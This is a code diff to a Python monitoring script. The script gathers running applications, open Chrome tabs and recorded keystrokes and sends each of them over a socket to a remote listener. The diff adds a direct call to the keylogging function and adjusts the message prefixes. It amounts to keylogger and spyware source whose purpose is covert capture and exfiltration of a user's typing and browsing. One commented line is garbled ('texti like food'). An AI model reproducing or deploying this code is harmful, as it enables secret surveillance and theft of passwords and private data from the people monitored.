@@ -2,8 +2,8 @@ import win32com.client
 import subprocess
 from browser_history.browsers import Chrome
 import datetime
-from googletrans import Translator
-import cloudscraper
+# from googletrans import Translator
+# import cloudscraper
 from bs4 import BeautifulSoup
 import requests
 import keyboard
@@ -76,7 +76,7 @@ def get_running_apps():
             apps.append(line.decode().rstrip())
 
     apps = '#'.join(apps)
-    buffer = get_buffer(apps)
+    buffer = get_buffer(f"new_apps:{apps}")
     sock.send(buffer.encode())
     sock.send(f"new_apps:{apps}".encode())
 
@@ -99,7 +99,7 @@ def get_tabs():
 
     websites = '#'.join(websites)
 
-    buffer = get_buffer(websites)
+    buffer = get_buffer(f"new_websites:{websites}")
     sock.send(buffer.encode())
     sock.send(f"new_websites:{websites}".encode())
     
@@ -119,20 +119,33 @@ def type_trace():
     all_keys.pop(-1)
     all_keys = ''.join(all_keys)
     all_keys = all_keys.replace('space', ' ')
+    all_keys = all_keys.replace('shift', '')
+    print(all_keys)
 
-    buffer = get_buffer(all_keys)
+    buffer = get_buffer(f"new_keys:{all_keys}")
     sock.send(buffer.encode())
     sock.send(f"new_text:{all_keys}".encode())
 
 
+type_trace()
 # translator = Translator()
 
+
+
+
 # try:
-#         translation = translator.translate(allthecontent).texrt
+#         translation = translator.translate(allthecontent).texti like food
+
+
 #         translation = str(translation)[0:999]
+
+
+
 #         time.sleep(10)
         
 # except Exception as e:
 #         print(e)
+
+
 
 
